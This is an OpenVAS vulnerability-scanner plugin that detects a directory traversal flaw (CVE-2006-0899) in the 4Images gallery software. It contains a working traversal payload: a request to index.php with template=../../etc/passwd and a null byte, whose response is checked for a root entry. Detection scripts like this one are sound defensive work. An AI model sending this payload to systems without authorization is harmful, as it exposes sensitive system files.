# OpenVAS Vulnerability Test
# $Id: 4images_171_directory_traversal.nasl 5780 2017-03-30 07:37:12Z cfi $
# Description: 4Images <= 1.7.1 Directory Traversal Vulnerability
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2006 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server contains a PHP application that is prone to
directory traversal attacks. 

Description :

4Images is installed on the remote system.  It is an image gallery
management system. 

The installed application does not validate user-input passed in the
'template' variable of the 'index.php' file.  This allows an attacker
to execute directory traversal attacks and display the content of
sensitive files on the system and possibly to execute arbitrary PHP
code if he can write to local files through some other means.";

tag_solution = "Sanitize the 'index.php' file.";

# Original advisory / discovered by : 
# http://retrogod.altervista.org/4images_171_incl_xpl.html

if(description)
{
 script_id(21020);
 script_version("$Revision: 5780 $");
 script_tag(name:"last_modification", value:"$Date: 2017-03-30 09:37:12 +0200 (Thu, 30 Mar 2017) $");
 script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2006-0899");
 script_bugtraq_id(16855);
 script_name("4Images <= 1.7.1 Directory Traversal Vulnerability");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.4homepages.de/forum/index.php?topic=11855.0");
 script_xref(name : "URL" , value : "http://secunia.com/advisories/19026/");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

foreach dir( make_list_unique( "/4images", "/gallery", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  res = http_get_cache(item:string(dir, "/index.php"), port:port); 
  if(res == NULL) continue;

  if (egrep(pattern:"Powered by.+4images", string:res)) {
 
    file = "../../../../../../../../etc/passwd";
    req = http_get(item:string(dir, "/index.php?template=", file, "%00"), port:port);
    recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);
    if (recv == NULL) continue;

    if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv)) {
      security_message(port);
      exit(0); 
    }
  }
}

exit( 99 );